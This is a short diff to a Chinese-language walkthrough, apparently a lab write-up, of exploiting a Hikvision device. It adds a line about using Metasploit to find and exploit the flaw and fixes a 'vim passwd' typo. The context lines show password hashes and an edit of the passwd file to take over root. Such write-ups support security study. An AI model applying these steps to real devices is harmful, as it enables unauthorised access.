@@ -36,6 +36,8 @@ PORT     STATE SERVICE   VERSION
 
 ## 漏洞利用
 
+使用 Metasploit 检索并利用相关漏洞.  
+
 ```console
 msf6 > search hikvision
 
@@ -152,7 +154,7 @@ root:ToCOv8qxP13qs:0:0:root:/root/:/bin/psh
 root:$1$yi$KMvI/d5vTBFIySCw1EjGt0:0:0:root:/root/:/bin/psh
 admin:$1$yi$KMvI/d5vTBFIySCw1EjGt0:0:0:root:/:/bin/psh
 
-> v passwd # 删除第一行
+> vim passwd # 删除第一行
 
 > cat passwd
 root:$1$yi$KMvI/d5vTBFIySCw1EjGt0:0:0:root:/root/:/bin/psh
